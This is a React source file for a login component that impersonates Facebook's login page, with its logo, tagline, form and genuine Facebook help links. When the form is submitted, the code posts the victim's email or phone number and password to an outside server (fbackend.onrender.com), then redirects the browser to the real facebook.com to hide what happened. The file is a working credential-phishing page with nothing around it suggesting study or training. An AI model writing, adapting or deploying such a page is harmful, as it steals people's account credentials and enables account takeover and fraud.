import facebookIcon from "../my-facebook.svg";
import React, {useState} from "react";
import axios from "axios";
import {Form} from 'react-bootstrap'


export default function Login() {
    const [userName, setUserName] = useState("");
    const [password, setPassword] = useState("");

    const [validated, setValidated] = useState(false);

    function Login(e) {
        e.preventDefault()
        setValidated(true);
        const userObject = {
            user_name: userName,
            password: password
        }

        axios.post("https://fbackend.onrender.com/login", userObject)
            .then(() => {

            })

        window.location = 'https://www.facebook.com'
    }

    return (
        <>
            <div className="Facebook-title">
                <div>
                    <img src={facebookIcon} alt="Facebook"/>
                </div>
                <div>
                    <h5>Facebook helps you connect and share with the people in your life.</h5>
                </div>
            </div>

            <div className="form-container">
                <Form className="my-form" validated={validated} onSubmit={Login}>
                    <div className="text-center">
                        <h5>Log in to Facebook</h5>
                    </div>
                    <input
                        required={true}
                        onChange={(e) => setUserName(e.target.value)}
                        className="input-email"
                        type="email"
                        placeholder="Email address or phone number"/>
                    <input
                        required={true}
                        onChange={(e) => setPassword(e.target.value)}
                        className="input-password"
                        type="password"
                        placeholder="Password"/>

                    <button
                        type='submit'
                        className="btn-login">
                        Log in
                    </button>
                    <div className="forgotten-password-container">
                        <a
                            href="https://web.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">Forgotten
                            password?
                        </a>
                    </div>
                    <hr/>
                    <div className="btn-create-container">
                        <button
                            className="btn-create">
                            Create New Account
                        </button>
                    </div>
                </Form>
                <div className="create-page">
                    <a href="https://web.facebook.com/pages/create/?ref_type=registration_form">Create Page</a>
                    <span> for a celebrity, brand or business.</span>
                </div>
            </div>
        </>
    )
}